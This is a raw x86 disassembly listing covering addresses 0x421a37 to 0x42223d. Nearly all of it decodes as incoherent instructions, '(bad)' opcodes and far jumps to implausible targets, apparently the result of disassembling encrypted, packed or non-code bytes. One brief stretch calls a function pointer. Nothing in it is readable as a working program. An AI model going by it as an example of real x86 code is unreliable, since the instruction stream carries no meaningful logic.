  421a37:	cmp    bh,BYTE PTR [edi-0x6fd53292]
  421a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a3e:	sub    BYTE PTR [ebx-0x38e07006],bl
  421a44:	or     al,0x26
  421a46:	jg     0x421a31
  421a48:	push   edi
  421a49:	(bad)  
  421a4a:	jmp    0x29e0:0x8b15d9d6
  421a51:	sub    ch,BYTE PTR [ebx-0x68]
  421a54:	dec    edx
  421a55:	retf   0xd1f9
  421a58:	sub    edi,edx
  421a5a:	scas   eax,DWORD PTR es:[edi]
  421a5b:	out    dx,eax
  421a5c:	jmp    0xad:0xa19d9385
  421a63:	call   0xeb313772
  421a68:	cmc    
  421a69:	mov    eax,ds:0x6221b147
  421a6e:	mov    edi,0xdc4625fa
  421a73:	mov    BYTE PTR [ebx+ebp*4],ch
  421a76:	add    eax,0xe86ac9f4
  421a7b:	push   0x837b46aa
  421a80:	inc    esp
  421a81:	add    edx,DWORD PTR [eax]
  421a83:	pop    es
  421a84:	aam    0x9f
  421a86:	(bad)  
  421a87:	in     eax,0x30
  421a89:	push   esp
  421a8a:	mov    WORD PTR [ebx+ebx*2-0x42c2743d],es
  421a91:	push   eax
  421a92:	retf   0x34d9
  421a95:	xchg   esi,ecx
  421a97:	daa    
  421a98:	lds    ecx,FWORD PTR [esp+esi*1+0x4519d0ad]
  421a9f:	jg     0x421a8c
  421aa1:	idiv   DWORD PTR fs:[eax-0x63]
  421aa5:	into   
  421aa6:	xchg   DWORD PTR [edx+0x7acc9b29],esi
  421aac:	inc    edx
  421aad:	cmp    BYTE PTR [edx-0x37],dh
  421ab0:	mov    bl,0xe7
  421ab2:	bnd jle 0x421a8c
  421ab5:	push   ebp
  421ab6:	add    edx,edx
  421ab8:	and    eax,0x561a6897
  421abd:	stos   DWORD PTR es:[edi],eax
  421abe:	(bad)  
  421abf:	(bad)  
  421ac0:	in     al,dx
  421ac1:	rcr    esi,1
  421ac3:	mov    ah,0x7c
  421ac5:	push   ebx
  421ac6:	sti    
  421ac7:	xor    ah,cl
  421ac9:	jne    0x421aff
  421acb:	jge    0x421b2f
  421acd:	sysenter 
  421acf:	loop   0x421a71
  421ad1:	mov    dl,0x10
  421ad3:	or     BYTE PTR [ebx-0x73b78a62],bh
  421ad9:	dec    esp
  421ada:	jns    0x421a6e
  421adc:	mov    cl,0xa0
  421ade:	call   esp
  421ae0:	mov    ds:0x6622450a,al
  421ae5:	push   edi
  421ae6:	mov    dl,0xbf
  421ae8:	mov    ebx,0xb8ff30eb
  421aed:	dec    ecx
  421aee:	bound  ecx,QWORD PTR [eax+eax*4-0x4c]
  421af2:	(bad)  
  421af3:	xchg   ecx,eax
  421af4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421af5:	ficom  DWORD PTR [ecx-0x44]
  421af8:	mov    edi,0x837f1e63
  421afd:	push   edi
  421afe:	mov    ds:0x8d8be328,eax
  421b03:	in     al,0x27
  421b05:	mov    dl,0x3
  421b07:	call   0x9502b8f9
  421b0c:	adc    ah,cl
  421b0e:	std    
  421b0f:	(bad)
  421b13:	icebp  
  421b14:	mov    esp,0xc6ff14ef
  421b19:	dec    edx
  421b1a:	call   0xacfc:0xf0b4574e
  421b21:	add    eax,0xddc8cb97
  421b26:	pop    esp
  421b27:	cli    
  421b28:	xor    al,0xde
  421b2a:	out    0x4f,al
  421b2c:	cmc    
  421b2d:	mov    dl,0xfb
  421b2f:	pop    esp
  421b30:	xchg   ecx,eax
  421b31:	and    dl,BYTE PTR cs:[ebp-0x4d]
  421b35:	pop    ebx
  421b36:	int3   
  421b37:	xlat   BYTE PTR ds:[ebx]
  421b38:	inc    ecx
  421b39:	inc    esp
  421b3a:	sub    DWORD PTR [eax+ebx*2+0x67],ebp
  421b3e:	shr    BYTE PTR [ecx+edx*2],0xa4
  421b42:	inc    ebx
  421b43:	add    eax,0x9f534523
  421b48:	push   eax
  421b49:	xor    eax,0xee50df33
  421b4e:	outs   dx,BYTE PTR ds:[esi]
  421b4f:	int3   
  421b50:	ins    DWORD PTR es:[edi],dx
  421b51:	les    eax,FWORD PTR [eax+0x1cd97314]
  421b57:	add    edi,ebp
  421b59:	pop    eax
  421b5a:	mov    edx,0xfa507f1b
  421b5f:	shl    esi,1
  421b61:	inc    edx
  421b62:	sbb    al,0x40
  421b64:	xchg   esp,eax
  421b65:	sub    al,0x1d
  421b67:	ds (bad) 
  421b69:	push   0xffffff89
  421b6b:	mov    cl,0x3b
  421b6d:	jae    0x421b7e
  421b6f:	cmp    BYTE PTR [eax-0x2f8cf29e],ah
  421b75:	add    BYTE PTR [eax],0x13
  421b78:	or     edx,DWORD PTR [eax+eiz*8]
  421b7b:	add    ebp,DWORD PTR [esp+ecx*4]
  421b7e:	out    0xc,al
  421b80:	mov    ds:0x60bf7b8f,eax
  421b85:	rcl    dl,1
  421b87:	mov    ebx,0x24289d90
  421b8c:	call   0x763433d9
  421b91:	scas   eax,DWORD PTR es:[edi]
  421b92:	loop   0x421b64
  421b94:	adc    BYTE PTR [ecx],0x8c
  421b97:	adc    eax,0xcf812a16
  421b9c:	pushf  
  421b9d:	(bad)  
  421b9e:	mov    al,0x5c
  421ba0:	lahf   
  421ba1:	test   al,cl
  421ba3:	inc    eax
  421ba4:	(bad)  
  421ba6:	test   eax,0xdc76e6aa
  421bab:	xchg   esi,eax
  421bac:	cmp    eax,0xba0a49b3
  421bb1:	mul    DWORD PTR [ebx+ecx*2-0x7a]
  421bb5:	jmp    0x421bb2
  421bb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bb8:	rcl    BYTE PTR [esi-0x72092928],cl
  421bbe:	push   ecx
  421bbf:	pop    ecx
  421bc0:	retf   0x43cc
  421bc3:	mov    eax,ds:0x4fe4aadc
  421bc8:	imul   ecx,DWORD PTR [ecx],0xd
  421bcb:	mov    al,0xd8
  421bcd:	mov    eax,0xaceb3813
  421bd2:	push   esi
  421bd3:	jle    0x421c22
  421bd5:	pusha  
  421bd6:	mov    dl,dh
  421bd8:	adc    BYTE PTR [ecx-0x3f8ddb08],0x34
  421bdf:	dec    edi
  421be0:	jecxz  0x421b7d
  421be2:	in     al,dx
  421be3:	adc    esp,DWORD PTR [edx]
  421be5:	xchg   esp,eax
  421be6:	ins    BYTE PTR es:[edi],dx
  421be7:	xchg   BYTE PTR [esi],bl
  421be9:	mov    DWORD PTR [edi],esp
  421beb:	jno    0x421b9c
  421bed:	xor    BYTE PTR [edi-0x64],al
  421bf0:	sub    BYTE PTR [edi],dl
  421bf2:	scas   eax,DWORD PTR es:[edi]
  421bf3:	sub    DWORD PTR [edi],ebp
  421bf5:	mov    al,BYTE PTR [edx-0x66773c37]
  421bfb:	js     0x421c38
  421bfd:	jg     0x421c65
  421bff:	mov    ch,0xe3
  421c01:	adc    BYTE PTR ds:0x315b09d7,bh
  421c07:	adc    ecx,ecx
  421c09:	jb     0x421c84
  421c0b:	div    BYTE PTR [edi-0x765593c5]
  421c11:	dec    ebx
  421c12:	lahf   
  421c13:	outs   dx,DWORD PTR ds:[esi]
  421c14:	pop    es
  421c15:	test   BYTE PTR [edx+edx*4-0x53642a42],0x3b
  421c1d:	push   ecx
  421c1e:	mov    DWORD PTR [eax+ebp*8-0x5780eb5f],esi
  421c25:	hlt    
  421c26:	pop    ds
  421c27:	mov    ch,0xd7
  421c29:	es sbb al,0x76
  421c2c:	mov    dh,BYTE PTR [ecx-0x25b1081e]
  421c32:	sub    al,0xef
  421c34:	jnp    0x421c97
  421c36:	adc    BYTE PTR [edx],ah
  421c38:	mov    edx,0x6d79c72
  421c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c3e:	xor    eax,0x87c92520
  421c43:	sub    al,0x6e
  421c45:	sbb    edx,DWORD PTR [ebp+0x5b]
  421c48:	std    
  421c49:	in     eax,dx
  421c4a:	mov    edi,0x90fe608d
  421c4f:	mov    esi,0xc882451d
  421c54:	mul    BYTE PTR [eax]
  421c56:	sbb    eax,0x19df99cf
  421c5b:	sahf   
  421c5c:	icebp  
  421c5d:	sbb    esp,esp
  421c5f:	or     eax,0xe99cb2f7
  421c64:	or     DWORD PTR [esi-0x4b],0xc3a48c92
  421c6b:	jecxz  0x421cb1
  421c6d:	mov    ebx,DWORD PTR [ebx-0x6a]
  421c70:	or     edx,edi
  421c72:	test   BYTE PTR [ecx+0x2645b932],bh
  421c78:	outs   dx,BYTE PTR ds:[esi]
  421c79:	cmp    al,0x7f
  421c7b:	(bad)  
  421c7c:	cwde   
  421c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c7e:	rcl    BYTE PTR [ebx],0x6e
  421c81:	xchg   esi,eax
  421c82:	or     BYTE PTR [ebx],0x93
  421c85:	lock dec esi
  421c87:	call   0xaef8f12c
  421c8c:	outs   dx,DWORD PTR ds:[esi]
  421c8d:	(bad)  
  421c8e:	call   0xae895cde
  421c93:	fcmovnbe st,st(0)
  421c95:	mov    edx,fs
  421c97:	out    0xa2,al
  421c99:	inc    ebp
  421c9a:	pop    edx
  421c9b:	mov    esp,0xab24e587
  421ca0:	cli    
  421ca1:	push   0xeda0b520
  421ca6:	push   cs
  421ca7:	sbb    DWORD PTR [esi-0x14],esp
  421caa:	pop    esi
  421cab:	imul   edi,DWORD PTR [edi+0x2f],0xe70ebf6b
  421cb2:	mov    esi,0x339a3cc8
  421cb7:	pop    ds
  421cb8:	push   0x30
  421cba:	jmp    0xb072:0xae9106a9
  421cc1:	push   edx
  421cc2:	or     DWORD PTR [ecx*2-0x68e2f372],esi
  421cc9:	mov    eax,0xec22581d
  421cce:	or     bl,BYTE PTR [ecx-0x76c3bd82]
  421cd4:	repz js 0x421d1d
  421cd7:	jmp    0x45d00687
  421cdc:	dec    edi
  421cdd:	sar    bh,0x17
  421ce0:	sahf   
  421ce1:	imul   DWORD PTR [ebp+0x3514bb40]
  421ce7:	mov    dl,0x99
  421ce9:	ja     0x421d31
  421ceb:	out    0xf1,al
  421ced:	les    esp,FWORD PTR [eax+0x1913d1d]
  421cf3:	mov    ebp,0x5956c687
  421cf8:	int    0x93
  421cfa:	add    BYTE PTR [edi-0x361adb8],al
  421d00:	cli    
  421d01:	frstor [edi+eiz*8]
  421d04:	mov    ebx,eax
  421d06:	hlt    
  421d07:	push   0xffffffb8
  421d09:	jmp    0x49b9:0xf1731c26
  421d10:	push   ss
  421d11:	inc    ebx
  421d12:	mov    dh,0xed
  421d14:	push   ds
  421d15:	loopne 0x421d7b
  421d17:	cmp    eax,0x786f151
  421d1c:	add    ebp,DWORD PTR [ebp-0x1a7f4585]
  421d22:	xor    DWORD PTR [ebx],ebx
  421d24:	mul    dh
  421d26:	adc    bh,bl
  421d28:	xchg   edx,eax
  421d29:	fstp   TBYTE PTR [ebp+0x40]
  421d2c:	test   DWORD PTR [edi+0x376ba71b],ebp
  421d32:	mov    bl,0x34
  421d34:	fs push esi
  421d36:	mov    dl,BYTE PTR [ebp+0x71]
  421d39:	dec    esp
  421d3a:	sbb    DWORD PTR [esi+0x27865026],ebp
  421d40:	mov    esi,0x84e383fb
  421d45:	mov    edi,0x2c56a303
  421d4a:	cmp    al,0x90
  421d4c:	inc    esp
  421d4d:	add    DWORD PTR [eax],eax
  421d4f:	pop    ecx
  421d50:	sbb    esi,0x5318e992
  421d56:	xor    BYTE PTR [eax-0x559c93b5],ah
  421d5c:	jp     0x421db3
  421d5e:	scas   al,BYTE PTR es:[edi]
  421d5f:	mov    ebx,0x3e18fba6
  421d64:	xchg   ebp,eax
  421d65:	js     0x421d9b
  421d67:	inc    eax
  421d68:	add    bl,dl
  421d6a:	div    BYTE PTR [ebp+edx*2+0x55190d1a]
  421d71:	inc    eax
  421d72:	out    0xe1,al
  421d74:	inc    ebp
  421d75:	fs or  esp,0xffffffaa
  421d79:	jne    0x421da1
  421d7b:	dec    esp
  421d7c:	or     DWORD PTR [ebx-0x3a91c753],ebp
  421d82:	aas    
  421d83:	ror    esi,1
  421d85:	inc    edx
  421d86:	cmp    eax,0x8a019475
  421d8b:	sbb    BYTE PTR [edi-0x66dee5d6],bl
  421d91:	xchg   ebp,eax
  421d92:	(bad)
  421d95:	push   eax
  421d96:	clc    
  421d97:	lods   eax,DWORD PTR ds:[esi]
  421d98:	or     al,0xc5
  421d9a:	sub    edx,ebp
  421d9c:	mov    dh,0x69
  421d9e:	dec    edx
  421d9f:	pop    ss
  421da0:	sahf   
  421da1:	sar    DWORD PTR [edx+0x1ced1667],0xe4
  421da8:	ret    
  421da9:	inc    ebp
  421daa:	and    ebx,ebx
  421dac:	verw   WORD PTR [ebx]
  421daf:	js     0x421d64
  421db1:	dec    esp
  421db2:	inc    edi
  421db3:	fidivr DWORD PTR [edx]
  421db5:	mov    eax,0xa10ae5ab
  421dba:	jge    0x421d6a
  421dbc:	push   es
  421dbd:	lds    ebx,FWORD PTR [edx-0xd]
  421dc0:	es sbb al,0x9f
  421dc3:	sub    esp,DWORD PTR [edi]
  421dc5:	test   DWORD PTR [esi+0x6fd277dc],ecx
  421dcb:	xchg   BYTE PTR [eax],al
  421dcd:	mov    ebp,0x7bacddae
  421dd2:	and    cl,BYTE PTR [eax]
  421dd4:	pop    ebx
  421dd5:	cmp    DWORD PTR [eax-0x4e],eax
  421dd8:	adc    al,0xd8
  421dda:	clc    
  421ddb:	aam    0x0
  421ddd:	scas   al,BYTE PTR es:[edi]
  421dde:	pop    esp
  421ddf:	mov    ds:0xd00825a3,eax
  421de4:	ins    DWORD PTR es:[edi],dx
  421de5:	mov    dh,0x20
  421de7:	push   cs
  421de8:	lahf   
  421de9:	sbb    DWORD PTR [esi+0x5],0xffffffbd
  421ded:	jae    0x421e50
  421def:	and    DWORD PTR [eax-0x1812f279],ebx
  421df5:	data16 arpl dx,cx
  421df8:	inc    ebx
  421df9:	jecxz  0x421e15
  421dfb:	bound  ebp,QWORD PTR [ecx-0x64905128]
  421e01:	jg     0x421e02
  421e03:	inc    ecx
  421e04:	add    BYTE PTR [eax+eiz*1],bh
  421e07:	je     0x421e20
  421e09:	jne    0x421e45
  421e0b:	ins    BYTE PTR es:[edi],dx
  421e0c:	push   ds
  421e0d:	xor    dh,BYTE PTR [eax+0x5c]
  421e10:	imul   edi,DWORD PTR [di-0x12ca],0x96d7dc73
  421e19:	les    eax,FWORD PTR [edx+0x33c41c9f]
  421e1f:	stc    
  421e20:	push   edi
  421e21:	xchg   esi,eax
  421e22:	mov    dl,0xd6
  421e24:	add    al,0x6d
  421e26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e27:	mov    al,ds:0xfaff5e51
  421e2c:	fistp  QWORD PTR [ebx]
  421e2e:	push   es
  421e2f:	ficomp DWORD PTR [edi+ebx*2-0x6e]
  421e33:	loope  0x421e40
  421e35:	push   cs
  421e36:	inc    edx
  421e37:	stc    
  421e38:	push   es
  421e39:	loopne 0x421e34
  421e3b:	jb     0x421e9d
  421e3d:	push   ss
  421e3e:	jl     0x421e3c
  421e40:	and    DWORD PTR [eax+0x531b370c],0xffffffc9
  421e47:	stc    
  421e48:	(bad)  
  421e49:	aas    
  421e4a:	retf   
  421e4b:	push   ebx
  421e4c:	test   eax,0xec16f84d
  421e51:	jmp    0xce74:0xc2d0cf7a
  421e58:	adc    DWORD PTR [eax+edx*8],0x267b70b9
  421e5f:	pushf  
  421e60:	sbb    al,0xba
  421e62:	xor    ecx,DWORD PTR [esi]
  421e64:	call   0x8384:0x606bf3d3
  421e6b:	(bad)  
  421e6c:	cmp    eax,0x5ed8985f
  421e71:	ret    0x2579
  421e74:	and    al,0xb4
  421e76:	jno    0x421ed4
  421e78:	adc    esp,DWORD PTR [ebp+0x53]
  421e7b:	lock call 0x908f:0xb395954
  421e83:	fsubp  st(3),st
  421e85:	jb     0x421ed6
  421e87:	push   ss
  421e88:	add    ebx,DWORD PTR [ebp-0x2af13278]
  421e8e:	pop    edx
  421e8f:	test   al,0xd
  421e91:	je     0x421ee3
  421e93:	outs   dx,DWORD PTR ds:[esi]
  421e94:	clc    
  421e95:	sub    esi,ecx
  421e97:	shl    BYTE PTR [ecx+ecx*1+0x719ee036],1
  421e9e:	dec    esp
  421e9f:	mov    BYTE PTR [ebx-0x67e7a61d],ch
  421ea5:	std    
  421ea6:	bswap  esp
  421ea8:	push   0x766108bb
  421ead:	mov    ds:0x6f5b71ef,al
  421eb2:	popa   
  421eb3:	fs mov bl,0xab
  421eb6:	inc    esp
  421eb7:	call   0x4c8b7505
  421ebc:	rol    BYTE PTR [edx+0x5f],1
  421ebf:	rcl    BYTE PTR [eax-0x57],cl
  421ec2:	dec    eax
  421ec3:	stos   DWORD PTR es:[edi],eax
  421ec4:	mov    al,ds:0xe31f68af
  421ec9:	das    
  421eca:	leave  
  421ecb:	mov    ah,0x9c
  421ecd:	push   0x43
  421ecf:	ret    
  421ed0:	xor    cl,dh
  421ed2:	jmp    0x59f:0xc586fac2
  421ed9:	outs   dx,BYTE PTR ds:[esi]
  421eda:	hlt    
  421edb:	pop    eax
  421edc:	jg     0x421ed9
  421ede:	call   0xc62c0e39
  421ee3:	sbb    eax,0xb2d94a19
  421ee8:	int    0xaa
  421eea:	pushf  
  421eeb:	jmp    0xe47af79a
  421ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ef1:	jmp    FWORD PTR [ecx]
  421ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ef4:	nop
  421ef5:	mov    edi,0xbcd7f8d7
  421efa:	retf   
  421efb:	fimul  WORD PTR [edi+esi*4-0xf77db7b]
  421f02:	dec    ebp
  421f03:	popf   
  421f04:	ffreep st(1)
  421f06:	jno    0x421e99
  421f08:	sub    eax,0x57712816
  421f0d:	push   edx
  421f0e:	xchg   DWORD PTR [eax+0x41f0f691],ebx
  421f14:	add    dl,BYTE PTR [edi+0x7009156f]
  421f1a:	fisub  WORD PTR [edx]
  421f1c:	rcl    BYTE PTR [esi+0x6d],0xc2
  421f20:	shr    DWORD PTR [ebx-0x38a1e14],0x5d
  421f27:	pop    ebx
  421f28:	cs popf 
  421f2a:	jg     0x421f3a
  421f2c:	push   0x11
  421f2e:	pop    esi
  421f2f:	out    dx,eax
  421f30:	ss ret 
  421f32:	cmp    al,0x1f
  421f34:	and    eax,0x3461e19a
  421f39:	bnd jne 0x421eed
  421f3c:	push   cs
  421f3d:	out    dx,eax
  421f3e:	(bad)  
  421f3f:	cli    
  421f40:	in     eax,0xa0
  421f42:	aaa    
  421f43:	pusha  
  421f44:	dec    ebp
  421f45:	mov    DWORD PTR [edi+0x6a],ecx
  421f48:	lods   al,BYTE PTR ds:[esi]
  421f49:	mov    ds:0xa883eff3,al
  421f4e:	shl    ebx,1
  421f50:	retf   0x34db
  421f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f54:	arpl   WORD PTR [ebx-0x21115ec1],cx
  421f5a:	pop    edx
  421f5b:	das    
  421f5c:	jo     0x421f50
  421f5e:	xor    DWORD PTR [edi],eax
  421f60:	es ret 0x8cf1
  421f64:	and    dh,BYTE PTR [ebp-0x2c609b97]
  421f6a:	xor    dh,BYTE PTR [eax-0x307fa086]
  421f70:	cmp    ebx,DWORD PTR [esi+edx*2+0x6e]
  421f74:	aam    0x43
  421f76:	inc    esi
  421f77:	stos   DWORD PTR es:[edi],eax
  421f78:	rcr    BYTE PTR [ebx-0x16516a69],cl
  421f7e:	sub    eax,0xe2055a14
  421f83:	pop    ecx
  421f84:	add    DWORD PTR [esi+eax*4+0x71],ebp
  421f88:	sbb    esp,esi
  421f8a:	jle    0x421fbc
  421f8c:	dec    ebx
  421f8d:	add    DWORD PTR [esi-0x70],ebp
  421f90:	jg     0x421f25
  421f92:	ficomp DWORD PTR [edi+esi*2-0x52]
  421f96:	(bad)  
  421f97:	scas   eax,DWORD PTR es:[edi]
  421f98:	lea    ebp,[esi+0x59c9c649]
  421f9e:	mov    BYTE PTR [ecx],bh
  421fa0:	xchg   esi,eax
  421fa1:	push   esi
  421fa2:	jl     0x421f6a
  421fa4:	xor    ecx,DWORD PTR [edx-0x1b]
  421fa7:	sub    al,0x28
  421fa9:	test   BYTE PTR [edi],0xd3
  421fac:	cmp    DWORD PTR [ebx-0x1e3def54],eax
  421fb2:	inc    esi
  421fb3:	aas    
  421fb4:	mov    bh,0x5c
  421fb6:	xor    eax,ecx
  421fb8:	nop
  421fb9:	lods   eax,DWORD PTR ds:[esi]
  421fba:	mov    DWORD PTR [eax-0x72616a4],ebx
  421fc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fc1:	adc    eax,0x7ec8237e
  421fc6:	adc    eax,0xdc4c2326
  421fcb:	jmp    0x2ed228bd
  421fd0:	dec    ebp
  421fd1:	jbe    0x422037
  421fd3:	push   esi
  421fd4:	aaa    
  421fd5:	addr16 jp 0x42201e
  421fd8:	jecxz  0x421fc8
  421fda:	mov    WORD PTR ds:0xeb52cfbc,ds
  421fe0:	aaa    
  421fe1:	fnstsw WORD PTR [ecx]
  421fe3:	adc    al,0x40
  421fe5:	jnp    0x42204e
  421fe7:	fwait
  421fe8:	and    DWORD PTR [ebp+0x59],esi
  421feb:	inc    eax
  421fec:	mov    edi,0x7cf09330
  421ff1:	outs   dx,DWORD PTR ds:[esi]
  421ff2:	mov    edx,0x9c21b235
  421ff7:	mov    bl,0xb2
  421ff9:	mov    DWORD PTR [ebp+0x251201e6],ebx
  421fff:	xchg   ecx,eax
  422000:	mov    dl,0x8b
  422002:	fs and eax,0x988729ee
  422008:	jl     0x42204f
  42200a:	jns    0x42200d
  42200c:	std    
  42200d:	xor    edi,DWORD PTR [eax]
  42200f:	test   edx,ecx
  422011:	push   ss
  422012:	mov    ds:0xa668af48,eax
  422017:	and    al,0x68
  422019:	inc    ecx
  42201a:	mov    dh,0x4d
  42201c:	xchg   esi,eax
  42201d:	lahf   
  42201e:	cmp    esi,DWORD PTR [edi-0x4f]
  422021:	sahf   
  422022:	scas   al,BYTE PTR es:[edi]
  422023:	call   0xe7ead0e8
  422028:	inc    ebp
  422029:	int    0x2a
  42202b:	test   esi,ebp
  42202d:	jl     0x4220a4
  42202f:	cmc    
  422030:	mov    DWORD PTR [esi],edi
  422032:	or     al,0xb6
  422034:	in     al,0x83
  422036:	(bad)  [edx+0x58]
  422039:	push   edi
  42203a:	icebp  
  42203b:	add    ecx,DWORD PTR [edx+0x22]
  42203e:	sbb    esi,eax
  422040:	fimul  WORD PTR [eax]
  422042:	icebp  
  422043:	iret   
  422044:	push   esp
  422045:	xchg   ebp,eax
  422046:	je     0x42208f
  422048:	lahf   
  422049:	addr16 and esp,edi
  42204c:	xlat   BYTE PTR ds:[ebx]
  42204d:	ins    DWORD PTR es:[edi],dx
  42204e:	add    al,dl
  422050:	das    
  422051:	push   cs
  422052:	xor    dl,ah
  422054:	in     eax,0xcd
  422056:	iret   
  422057:	aam    0xec
  422059:	jb     0x422025
  42205b:	jl     0x422070
  42205d:	adc    ch,BYTE PTR [edx+0x35ffcc32]
  422063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422064:	add    DWORD PTR [edx+0x0],0xffffffff
  422068:	xor    eax,0x428423
  42206d:	push   DWORD PTR [ebp-0x28]
  422070:	push   DWORD PTR [ebp-0x2c]
  422073:	mov    eax,DWORD PTR [ebp-0x14]
  422076:	call   eax
  422078:	mov    eax,DWORD PTR [ebp-0x30]
  42207b:	jmp    0x422552
  422080:	xchg   ebp,eax
  422081:	rol    DWORD PTR [edx],0x97
  422084:	push   es
  422085:	mov    eax,DWORD PTR [edi+0x689842c3]
  42208b:	not    BYTE PTR [esi]
  42208d:	daa    
  42208e:	or     al,0xeb
  422090:	mov    al,ds:0xc47a7d8a
  422095:	jle    0x422111
  422097:	jp     0x42204b
  422099:	test   al,0x30
  42209b:	cdq    
  42209c:	push   cs
  42209d:	push   ds
  42209e:	cs ret 0x7aa5
  4220a2:	mov    cl,0xaf
  4220a4:	gs jmp 0x5dd97f60
  4220aa:	(bad)  
  4220ab:	mov    ebp,0x2f0967d8
  4220b0:	lds    esp,FWORD PTR [edx]
  4220b2:	sti    
  4220b3:	mov    bh,0xd1
  4220b5:	or     eax,0x7e70c6db
  4220ba:	(bad)  
  4220bc:	retf   
  4220bd:	and    bl,dh
  4220bf:	push   0x8cbc7879
  4220c4:	dec    edx
  4220c5:	xchg   ebp,eax
  4220c6:	xchg   edx,eax
  4220c7:	or     eax,ebx
  4220c9:	xor    DWORD PTR [esi],edx
  4220cb:	cs xor eax,0x17e1294b
  4220d1:	push   esi
  4220d2:	arpl   WORD PTR [edi+0x29],bp
  4220d5:	mov    ch,0xf8
  4220d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220d8:	xchg   BYTE PTR ss:0xdfea7c5a,bh
  4220df:	sbb    ch,BYTE PTR [ebp+0x16db1b53]
  4220e5:	mov    ds:0x31cee6bf,al
  4220ea:	cwde   
  4220eb:	mov    esi,0xec914a41
  4220f0:	push   0x8de4e04e
  4220f5:	lods   al,BYTE PTR ds:[esi]
  4220f6:	test   DWORD PTR [edi],eax
  4220f8:	and    al,0x2f
  4220fa:	mov    DWORD PTR [ecx],ebx
  4220fc:	call   0x4bd:0xe70e6ad2
  422103:	push   eax
  422104:	pop    esi
  422105:	or     al,0x35
  422107:	pusha  
  422108:	inc    ebp
  422109:	sub    al,0xa8
  42210b:	mov    edi,0x95ee01b1
  422110:	mov    cl,0x6c
  422112:	ret    0xf95c
  422115:	jecxz  0x422186
  422117:	and    DWORD PTR [ebp+0x2a],eax
  42211a:	push   esp
  42211b:	jnp    0x422152
  42211d:	clc    
  42211e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42211f:	mov    ah,0xa4
  422121:	int    0xc7
  422123:	fcom   QWORD PTR cs:[ebx-0x44]
  422127:	or     eax,0xdc978c64
  42212c:	xchg   ebx,eax
  42212d:	xor    al,0x7f
  42212f:	call   0x939ea1b2
  422134:	shr    BYTE PTR [eax+0x3],cl
  422137:	sub    BYTE PTR [ebp-0x63],al
  42213a:	cld    
  42213b:	and    BYTE PTR [eax],dh
  42213d:	outs   dx,DWORD PTR ds:[esi]
  42213e:	and    eax,0xbbb6bba2
  422143:	mov    eax,ds:0x74f87a03
  422148:	enter  0x2739,0x83
  42214c:	aas    
  42214d:	sub    edi,DWORD PTR [ebx-0x55c64ce2]
  422153:	in     eax,dx
  422154:	ds inc esi
  422156:	pop    ss
  422157:	cmp    eax,0xfe2ca298
  42215c:	sub    al,0xea
  42215e:	test   ebp,0x4e9a813d
  422164:	mov    eax,DWORD PTR [edx]
  422166:	pop    eax
  422167:	xor    DWORD PTR [eax],ebp
  422169:	ret    
  42216a:	jno    0x4221cf
  42216c:	cmp    ecx,esi
  42216e:	cmp    DWORD PTR [ebp+0x31],ebx
  422171:	jb     0x42217e
  422173:	jl     0x42217f
  422175:	push   cs
  422176:	popf   
  422177:	mov    bl,0xce
  422179:	mov    ebp,0xa37fe2db
  42217e:	sbb    eax,0x46ff8f69
  422183:	sub    eax,0x599e1d26
  422188:	sahf   
  422189:	pop    esi
  42218a:	cld    
  42218b:	push   edi
  42218c:	ss call 0xed0e:0xb68eae5e
  422194:	sub    esp,DWORD PTR [esi+ebx*2-0x3e]
  422198:	mov    bh,0xfe
  42219a:	sub    eax,0xb9e7458d
  42219f:	test   eax,0x653a6551
  4221a4:	jp     0x4221e9
  4221a6:	(bad)  
  4221a7:	rol    DWORD PTR [ecx+0x70],cl
  4221aa:	mov    ebp,0xf31a1e9f
  4221af:	(bad)  
  4221b0:	cli    
  4221b1:	and    esp,DWORD PTR [ebx+0x4b]
  4221b4:	dec    edi
  4221b5:	out    dx,al
  4221b6:	(bad)  
  4221b7:	lea    ebx,[ecx+0x17eced5b]
  4221bd:	data16 into 
  4221bf:	xchg   ebp,eax
  4221c0:	js     0x422236
  4221c2:	push   esi
  4221c3:	and    bl,BYTE PTR [edi-0x4]
  4221c6:	adc    eax,0xf87a834c
  4221cb:	in     eax,dx
  4221cc:	outs   dx,BYTE PTR ds:[esi]
  4221cd:	nop
  4221ce:	inc    eax
  4221cf:	inc    edx
  4221d0:	adc    eax,ebx
  4221d2:	jb     0x42221e
  4221d4:	addr16 and bl,ch
  4221d7:	jb     0x4221e9
  4221d9:	fst    DWORD PTR [eax-0x18133ed5]
  4221df:	pop    ss
  4221e0:	and    edx,DWORD PTR [ebx+0x72]
  4221e3:	xor    eax,0x7789cb18
  4221e8:	push   ecx
  4221e9:	(bad)  
  4221ea:	pushf  
  4221eb:	mov    BYTE PTR [ecx],cl
  4221ed:	cmp    edx,DWORD PTR [ebp-0x3112ee7c]
  4221f3:	shr    DWORD PTR [edx],cl
  4221f5:	cmp    dh,BYTE PTR [esi+ebx*4+0x2d]
  4221f9:	sub    DWORD PTR [ebp-0xff6d069],ebx
  4221ff:	mov    esi,DWORD PTR [ecx+0xdc1c3cf]
  422205:	jmp    0x6093:0xeba83721
  42220c:	add    al,0xf3
  42220e:	push   cs
  42220f:	dec    edi
  422210:	scas   eax,DWORD PTR es:[edi]
  422211:	imul   ebp,DWORD PTR ds:[ebp*1-0x7ef8bbc8],0x50
  42221a:	and    eax,0x20eee6dc
  42221f:	sbb    DWORD PTR [esi-0x59],0x58
  422223:	lods   al,BYTE PTR ds:[esi]
  422224:	scas   eax,DWORD PTR es:[edi]
  422225:	jo     0x4221cc
  422227:	iret   
  422228:	cmp    edx,0xfffffff4
  42222b:	repz jmp 0x855a:0x4ee4fbc0
  422233:	xchg   esp,eax
  422234:	fst    DWORD PTR [edx+0x3e]
  422237:	jmp    0xaf52f699
  42223c:	cli    
  42223d:	stos   BYTE PTR es:[edi],al
